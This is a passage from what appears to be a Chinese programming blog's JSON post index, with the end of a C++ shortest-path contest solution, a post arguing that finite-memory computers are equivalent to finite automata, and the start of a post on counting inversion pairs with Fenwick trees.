class=\"comment\">// 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (visit[t.me]) &#123;</span><br><span class=\"line\">            assert(resWei[t.me] &lt;= t.t);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (resWei[t.me] == t.t) &#123;</span><br><span class=\"line\">                tp[t.me].push_back(t.p);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        visit[t.me] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        tp[t.me].push_back(t.p);</span><br><span class=\"line\">        resWei[t.me] = t.t;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;adj = v[t.me].adj;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> al = adj.size();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; al; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adj[i] == t.me)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resWei[END];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> dp[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> dpVisit[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> f, <span class=\"keyword\">bool</span> isLength);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DFS</span><span class=\"params\">(<span class=\"keyword\">bool</span> isLength)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dp, <span class=\"number\">0xff</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(tpResult, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(tpResult));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dpVisit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(dpVisit));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __dfs(END, isLength);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> f, <span class=\"keyword\">bool</span> isLength) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dp[f] &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dp[f];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (f == BEGIN) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;t = tp[f];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> result = INF;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(t[i]==f)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dpVisit[t[i]])  <span class=\"comment\">// 代表该节点在这条路径上已经被访问过</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        dpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> p = __dfs(t[i], isLength) + (isLength ? <span class=\"number\">1</span> : length[t[i]][f]);</span><br><span class=\"line\">        dpVisit[f] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p &lt; result) &#123;</span><br><span class=\"line\">            tpResult[f] = t[i];</span><br><span class=\"line\">            result = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    dp[f] = result;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> path[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> outpVisit[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">outp</span><span class=\"params\">(<span class=\"keyword\">int</span> f, <span class=\"keyword\">int</span> index)</span> </span>&#123;</span><br><span class=\"line\">    outpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (f == BEGIN) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"outp: \"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; index; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; path[i] &lt;&lt; <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        outpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    path[index] = f;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;t = tp[f];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (outpVisit[t[i]])<span class=\"comment\">// means that 前辈们已经访问过了，再访问就成环了</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        outp(t[i], index + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outpVisit[f] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","slug":"天梯L3-007-天梯地图","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"Dijstra最短路","slug":"Dijstra最短路","permalink":"https://h-zex.github.io/tags/Dijstra最短路/"},{"name":"天梯赛","slug":"天梯赛","permalink":"https://h-zex.github.io/tags/天梯赛/"}]},{"title":"有限存储的计算机等价于有限自动机（DFA、NFA）","date":"2018-05-11T08:13:18.000Z","path":"2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/","text":"$B=\\{0^n1^n|n\\ge0\\}$ Michael Sipser 的 Introduction to the Theory of Computation 的1.4提到一个非正则语言的例子，$B=\\{0^n1^n|n\\ge0\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别 但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢 事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值 如果是n处于一定范围内，容易构造出一台DFA识别B： 设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量 那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集 转移方程为 首先： $&lt;0,0&gt;\\rightarrow&lt;1,0&gt;\\rightarrow&lt;2,0&gt;\\rightarrow…\\rightarrow&lt;1000,0&gt;$ 然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$ 然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值 最后：一旦转移到 $&lt;n, n&gt;$ 就accept 为什么现实中的计算机有可能是DFA 计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能 对任意一段代码构造等价的NFANFA构造方法描述 假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个） 输入字符表是$\\{0,1\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。 假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态 假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state 该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ 为什么该NFA只接受允许的字符串，而不会接受多余的字符串 首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串 设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA 则最终的NFA只接受允许的字符串 是否会出现情况：代码两次处于某状态但是行为不一样 答案是肯定不会 计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的 对任意一台计算机构造等价的DFA 对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算 先说明一些前置情况： 现实中计算机使用源码处理特定的输入 把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M 因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA 然后开始构造DFA 该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个 DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态 第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态 从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合 计算机可以死循环，DFA不会死循环，为什么 consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。 因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。 在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环 截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变 而按照Introduction to the Theory of Computation 的1.2节的EQUIVALENCE OF NFAS AND DFASDFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）： $E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了","raw":"---\ntitle: 有限存储的计算机等价于有限自动机（DFA、NFA）\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-11 16:13:18\ntags:\n- DFA\n- NFA\n- 有限自动机\n- 计算理论\ndescription: 区别于图灵机的无限纸带，现实的计算机只有有限存储，所以其不是TM，而是DFA/NFA\ncategories:\n- 计算理论\n\n---\n\n### $B=\\\\{0^n1^n|n\\ge0\\\\}$ \n\n- Michael Sipser 的 *Introduction to the Theory of Computation* 的1.4提到一个非正则语言的例子，$B=\\\\{0^n1^n|n\\ge0\\\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别\n- 但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢\n- 事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值\n- 如果是n处于一定范围内，容易构造出一台DFA识别B：\n  - 设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量\n  - 那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集\n  - 转移方程为\n    - 首先： $<0,0>\\rightarrow<1,0>\\rightarrow<2,0>\\rightarrow...\\rightarrow<1000,0>$\n    - 然后：从任意$<n,0>$ 都可以转移到 $<n,1>$\n    - 然后：一旦转移到 $<n,1>$ ，就不能转移到 $<n+k,m>, (k>0)$ ，也就是不能增长n的值\n    - 最后：一旦转移到 $<n, n>$ 就accept\n\n### 为什么现实中的计算机有可能是DFA\n\n- 计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能\n\n### 对任意一段代码构造等价的NFA\n\n##### NFA构造方法描述\n\n- 假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$<c1,c2,c3,c4,c5>$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）\n\n\n- 输入字符表是$\\\\{0,1\\\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。\n\n\n- 假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$<0,0,0,0,0>$ 就是起始态\n- 假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$<1,2,3,4,5>$ 就是该NFA的accept state\n- 该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$<d1,d2,d3,d4,d5>$ ，输入后处于 $<d6,d7,d8,d9,d10>$ ，则在从$<d1,d2,d3,d4,d5>$ 到 $<d6,d7,d8,d9,d10>$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ \n\n##### 为什么该NFA只接受允许的字符串，而不会接受多余的字符串\n\n- 首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串\n- 设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA\n- 则最终的NFA只接受允许的字符串\n\n##### 是否会出现情况：代码两次处于某状态但是行为不一样\n\n- 答案是肯定不会\n- 计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的\n\n### 对任意一台计算机构造等价的DFA\n\n- 对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算\n- 先说明一些前置情况：\n  - 现实中计算机使用源码处理特定的输入\n  - 把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M\n- 因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA\n- 然后开始构造DFA\n  - 该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个\n  - DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态\n  - 第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态\n- 从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合\n\n### 计算机可以死循环，DFA不会死循环，为什么\n\n- consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。\n\n\n- 因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。\n\n- 在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环\n\n- 截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变\n\n- 而按照*Introduction to the Theory of Computation* 的1.2节的*EQUIVALENCE OF NFAS AND DFAS*DFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：\n\n  {% asset_img 1.png %}\n\n  $E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了\n\n","content":"<h3 id=\"B-0-n1-n-n-ge0\"><a href=\"#B-0-n1-n-n-ge0\" class=\"headerlink\" title=\"$B=\\{0^n1^n|n\\ge0\\}$\"></a>$B=\\{0^n1^n|n\\ge0\\}$</h3><ul>\n<li>Michael Sipser 的 <em>Introduction to the Theory of Computation</em> 的1.4提到一个非正则语言的例子，$B=\\{0^n1^n|n\\ge0\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别</li>\n<li>但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢</li>\n<li>事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值</li>\n<li>如果是n处于一定范围内，容易构造出一台DFA识别B：<ul>\n<li>设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量</li>\n<li>那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集</li>\n<li>转移方程为<ul>\n<li>首先： $&lt;0,0&gt;\\rightarrow&lt;1,0&gt;\\rightarrow&lt;2,0&gt;\\rightarrow…\\rightarrow&lt;1000,0&gt;$</li>\n<li>然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$</li>\n<li>然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值</li>\n<li>最后：一旦转移到 $&lt;n, n&gt;$ 就accept</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"为什么现实中的计算机有可能是DFA\"><a href=\"#为什么现实中的计算机有可能是DFA\" class=\"headerlink\" title=\"为什么现实中的计算机有可能是DFA\"></a>为什么现实中的计算机有可能是DFA</h3><ul>\n<li>计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能</li>\n</ul>\n<h3 id=\"对任意一段代码构造等价的NFA\"><a href=\"#对任意一段代码构造等价的NFA\" class=\"headerlink\" title=\"对任意一段代码构造等价的NFA\"></a>对任意一段代码构造等价的NFA</h3><h5 id=\"NFA构造方法描述\"><a href=\"#NFA构造方法描述\" class=\"headerlink\" title=\"NFA构造方法描述\"></a>NFA构造方法描述</h5><ul>\n<li>假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）</li>\n</ul>\n<ul>\n<li>输入字符表是$\\{0,1\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。</li>\n</ul>\n<ul>\n<li>假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态</li>\n<li>假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state</li>\n<li>该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ </li>\n</ul>\n<h5 id=\"为什么该NFA只接受允许的字符串，而不会接受多余的字符串\"><a href=\"#为什么该NFA只接受允许的字符串，而不会接受多余的字符串\" class=\"headerlink\" title=\"为什么该NFA只接受允许的字符串，而不会接受多余的字符串\"></a>为什么该NFA只接受允许的字符串，而不会接受多余的字符串</h5><ul>\n<li>首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串</li>\n<li>设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA</li>\n<li>则最终的NFA只接受允许的字符串</li>\n</ul>\n<h5 id=\"是否会出现情况：代码两次处于某状态但是行为不一样\"><a href=\"#是否会出现情况：代码两次处于某状态但是行为不一样\" class=\"headerlink\" title=\"是否会出现情况：代码两次处于某状态但是行为不一样\"></a>是否会出现情况：代码两次处于某状态但是行为不一样</h5><ul>\n<li>答案是肯定不会</li>\n<li>计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的</li>\n</ul>\n<h3 id=\"对任意一台计算机构造等价的DFA\"><a href=\"#对任意一台计算机构造等价的DFA\" class=\"headerlink\" title=\"对任意一台计算机构造等价的DFA\"></a>对任意一台计算机构造等价的DFA</h3><ul>\n<li>对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算</li>\n<li>先说明一些前置情况：<ul>\n<li>现实中计算机使用源码处理特定的输入</li>\n<li>把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M</li>\n</ul>\n</li>\n<li>因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA</li>\n<li>然后开始构造DFA<ul>\n<li>该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个</li>\n<li>DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态</li>\n<li>第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态</li>\n</ul>\n</li>\n<li>从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合</li>\n</ul>\n<h3 id=\"计算机可以死循环，DFA不会死循环，为什么\"><a href=\"#计算机可以死循环，DFA不会死循环，为什么\" class=\"headerlink\" title=\"计算机可以死循环，DFA不会死循环，为什么\"></a>计算机可以死循环，DFA不会死循环，为什么</h3><ul>\n<li>consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。</li>\n</ul>\n<ul>\n<li><p>因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。</p>\n</li>\n<li><p>在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环</p>\n</li>\n<li><p>截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变</p>\n</li>\n<li><p>而按照<em>Introduction to the Theory of Computation</em> 的1.2节的<em>EQUIVALENCE OF NFAS AND DFAS</em>DFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：</p>\n<img src=\"/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/1.png\">\n<p>$E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了</p>\n</li>\n</ul>\n","slug":"有限存储的计算机等价于有限自动机（DFA、NFA）","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"DFA","slug":"DFA","permalink":"https://h-zex.github.io/tags/DFA/"},{"name":"NFA","slug":"NFA","permalink":"https://h-zex.github.io/tags/NFA/"},{"name":"有限自动机","slug":"有限自动机","permalink":"https://h-zex.github.io/tags/有限自动机/"},{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/tags/计算理论/"}]},{"title":"n元逆序对数量求解","date":"2018-03-19T16:05:01.000Z","path":"2018/03/20/n元逆序对数量求解/","text":"以下思路都是针对从小到大排序的序列的逆序对 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n] 首先看看如何求二元逆序对 从左到右扫描序列，对于序列中位置为i的值x，flag[x]+=1 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i] 那么result的数组的和就是逆序对的数量 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n]; 同样扫描序列，对于位置为i的数x，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量 求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中 到最后，result_3就是结果 更多元组的也如此思路 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对 对于n元逆序对，同理，数组记录了当前已有的数x作为最后一个元素是x的n-1元逆序对的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与比他大的数代表的n-1元逆序对形成了更长的逆序对 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第i位的值是x） 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）","raw":"---\ntitle: n元逆序对数量求解\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-03-20 00:05:01\ntags:\n- 算法\n- 树状数组\ndescription: n元逆序对数量求解并利用树状数组优化\ncategories:\n- 算法\n---\n\n> 以下思路都是针对从小到大排序的序列的逆序对\n\n- 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i>x_{i+1}>x_{i+2}>...$那么就是逆序对\n- 